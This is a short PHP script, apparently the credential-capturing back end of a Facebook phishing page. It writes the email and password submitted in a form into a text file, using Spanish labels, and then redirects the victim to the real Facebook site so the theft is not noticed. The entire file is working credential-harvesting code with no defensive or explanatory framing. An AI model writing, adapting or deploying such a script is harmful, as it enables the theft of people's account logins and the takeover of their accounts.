<?php 
file_put_contents("usuarios.txt", "  [~] Usuario de Facebook: " . $_POST['email'] . "\n  [~] Contraseña: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://www.facebook.com/');
exit();
?>
